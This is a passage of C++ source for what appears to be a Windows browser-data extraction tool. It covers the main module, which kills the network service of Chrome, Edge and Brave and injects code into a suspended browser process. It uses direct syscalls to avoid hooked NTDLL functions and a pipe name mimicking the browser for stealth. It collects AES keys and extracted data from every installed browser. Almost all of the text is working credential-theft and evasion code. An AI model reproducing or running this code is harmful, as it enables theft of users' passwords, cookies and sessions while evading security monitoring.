            if (i > 0 && i == items.size() - 1)
                summary << " and ";
            else if (i > 0)
                summary << ", ";
            summary << items[i];
        }
        summary << " from " << stats.profileCount << " profile" << (stats.profileCount != 1 ? "s" : "");
    }

    return summary.str();
}

void KillBrowserNetworkService(const Configuration &config, const Console &console)
{
    console.Debug("Scanning for and terminating browser network services...");

    UniqueHandle hCurrentProc;
    HANDLE nextProcHandle = nullptr;
    int processes_terminated = 0;

    while (NT_SUCCESS(NtGetNextProcess_syscall(hCurrentProc.get(), PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, 0, 0, &nextProcHandle)))
    {
        UniqueHandle hNextProc(nextProcHandle);
        hCurrentProc = std::move(hNextProc);

        std::vector<BYTE> buffer(sizeof(UNICODE_STRING_SYSCALLS) + MAX_PATH * 2);
        auto imageName = reinterpret_cast<PUNICODE_STRING_SYSCALLS>(buffer.data());
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessImageFileName, imageName, (ULONG)buffer.size(), NULL)) || imageName->Length == 0)
            continue;

        fs::path p(std::wstring(imageName->Buffer, imageName->Length / sizeof(wchar_t)));
        if (_wcsicmp(p.filename().c_str(), config.browserProcessName.c_str()) != 0)
            continue;

        PROCESS_BASIC_INFORMATION pbi{};
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr)) || !pbi.PebBaseAddress)
            continue;

        PEB peb{};
        if (!NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), pbi.PebBaseAddress, &peb, sizeof(peb), nullptr)))
            continue;
        RTL_USER_PROCESS_PARAMETERS params{};
        if (!NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), peb.ProcessParameters, &params, sizeof(params), nullptr)))
            continue;

        std::vector<wchar_t> cmdLine(params.CommandLine.Length / sizeof(wchar_t) + 1, 0);
        if (params.CommandLine.Length > 0 && !NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), params.CommandLine.Buffer, cmdLine.data(), params.CommandLine.Length, nullptr)))
            continue;

        if (wcsstr(cmdLine.data(), L"--utility-sub-type=network.mojom.NetworkService"))
        {
            console.Debug("Found and terminated network service PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
            NtTerminateProcess_syscall(hCurrentProc.get(), 0);
            processes_terminated++;
        }
    }

    if (processes_terminated > 0)
    {
        console.Debug("Termination sweep complete. Waiting for file locks to fully release.");
        Sleep(1500);
    }
}

PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &config, const Console &console)
{
    KillBrowserNetworkService(config, console);

    TargetProcess target(config, console);
    target.createSuspended();

    // Use browser-specific pipe name mimicry for stealth
    PipeCommunicator pipe(Utils::GenerateBrowserMimicPipeName(config.browserType), console);
    pipe.create();

    InjectionManager injector(target, console);
    injector.execute(pipe.getName());

    pipe.waitForClient();
    pipe.sendInitialData(config.verbose, config.extractFingerprint, config.outputPath);
    pipe.relayMessages();

    target.terminate();

    return pipe.getStats();
}

void DisplayExtractionSummary(const std::string &browserName, const PipeCommunicator::ExtractionStats &stats,
                              const Console &console, bool singleBrowser, const fs::path &outputPath)
{
    if (singleBrowser)
    {
        if (!stats.aesKey.empty())
            console.Success("AES Key: " + stats.aesKey);

        std::string summary = BuildExtractionSummary(stats);
        if (!summary.empty())
        {
            console.Success(summary);
            console.Success("Stored in " + (outputPath / browserName).u8string());
        }
        else
        {
            console.Warn("No data extracted");
        }
    }
    else
    {
        console.Info(browserName);

        if (!stats.aesKey.empty())
            console.Success("AES Key: " + stats.aesKey);

        std::string summary = BuildExtractionSummary(stats);
        if (!summary.empty())
        {
            console.Success(summary);
            console.Success("Stored in " + (outputPath / browserName).u8string());
        }
        else
        {
            console.Warn("No data extracted");
        }
    }
}

void ProcessAllBrowsers(const Console &console, bool verbose, bool extractFingerprint, const fs::path &outputPath)
{
    if (verbose)
        console.Info("Starting multi-browser extraction...");

    BrowserPathResolver resolver(console);
    auto installedBrowsers = resolver.findAllInstalledBrowsers();

    if (installedBrowsers.empty())
    {
        console.Error("No supported browsers found on this system");
        return;
    }

    if (!verbose)
        console.Info("Processing " + std::to_string(installedBrowsers.size()) + " browser(s):\n");

    int successCount = 0;
    int failCount = 0;

    for (size_t i = 0; i < installedBrowsers.size(); ++i)
    {
        const auto &[browserType, browserPath] = installedBrowsers[i];

        Configuration config;
        config.verbose = verbose;
        config.extractFingerprint = extractFingerprint;
        config.outputPath = outputPath;
        config.browserType = browserType;
        config.browserDefaultExePath = browserPath;

        static const std::map<std::wstring, std::pair<std::wstring, std::string>> browserMap = {
            {L"chrome", {L"chrome.exe", "Chrome"}},
            {L"edge", {L"msedge.exe", "Edge"}},
            {L"brave", {L"brave.exe", "Brave"}}};

        auto it = browserMap.find(browserType);
        if (it != browserMap.end())
        {
            config.browserProcessName = it->second.first;
            config.browserDisplayName = it->second.second;
        }

        if (verbose)
        {
            console.Info("\n[Browser " + std::to_string(i + 1) + "/" + std::to_string(installedBrowsers.size()) +
                         "] Processing " + config.browserDisplayName);
        }

        try
        {
            auto stats = RunInjectionWorkflow(config, console);
            successCount++;

            if (verbose)
            {
                console.Success(config.browserDisplayName + " extraction completed");
            }
            else
            {
                DisplayExtractionSummary(config.browserDisplayName, stats, console, false, config.outputPath);
                if (i < installedBrowsers.size() - 1)
                    std::cout << std::endl;
            }
        }
        catch (const std::exception &e)
        {
            failCount++;

            if (verbose)
            {
                console.Error(config.browserDisplayName + " extraction failed: " + std::string(e.what()));
            }
            else
            {
                console.Info(config.browserDisplayName);
                console.Error("Extraction failed");
                if (i < installedBrowsers.size() - 1)
                    std::cout << std::endl;
            }
        }
    }

    if (!verbose)
    {
        std::cout << std::endl;
        std::cout.flush();
    }
    console.Info("Completed: " + std::to_string(successCount) + " successful, " + std::to_string(failCount) + " failed");
    std::cout.flush();
}

int wmain(int argc, wchar_t *argv[])
{
    bool isVerbose = false;
    bool extractFingerprint = false;
    std::wstring browserTarget;
    fs::path outputPath;

    for (int i = 1; i < argc; ++i)
    {
        std::wstring_view arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v")
            isVerbose = true;
        else if (arg == L"--fingerprint" || arg == L"-f")
            extractFingerprint = true;
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
            outputPath = argv[++i];
        else if (arg == L"--help" || arg == L"-h")
        {
            Console(false).displayBanner();
            Console(false).printUsage();
            return 0;
        }
        else if (browserTarget.empty() && !arg.empty() && arg[0] != L'-')
            browserTarget = arg;
    }

    Console console(isVerbose);
    console.displayBanner();

    if (browserTarget.empty())
    {
        console.printUsage();
        return 0;
    }

    if (!InitializeSyscalls(isVerbose, true))
    {
        console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked or gadgets not found.");
        return 1;
    }

    if (outputPath.empty())
        outputPath = fs::current_path() / "output";

    std::error_code ec;
    fs::create_directories(outputPath, ec);
    if (ec)
    {
        console.Error("Failed to create output directory: " + outputPath.u8string() + ". Error: " + ec.message());
        return 1;
    }

    if (browserTarget == L"all")
    {
        try
        {
            ProcessAllBrowsers(console, isVerbose, extractFingerprint, outputPath);
        }
        catch (const std::exception &e)
        {
            console.Error(e.what());
            return 1;
        }
    }
    else
    {
        auto optConfig = Configuration::CreateFromArgs(argc, argv, console);
        if (!optConfig)
            return 1;

        try
        {
            if (!isVerbose)
                console.Info("Processing " + optConfig->browserDisplayName + "...\n");

            auto stats = RunInjectionWorkflow(*optConfig, console);

            if (!isVerbose)
            {
                DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true, optConfig->outputPath);
                std::cout.flush();
            }
            else
            {
                console.Success("Extraction completed successfully");
            }
        }
        catch (const std::runtime_error &e)
        {
            console.Error(e.what());
            return 1;
        }
    }

    std::cout.flush();
    return 0;
}
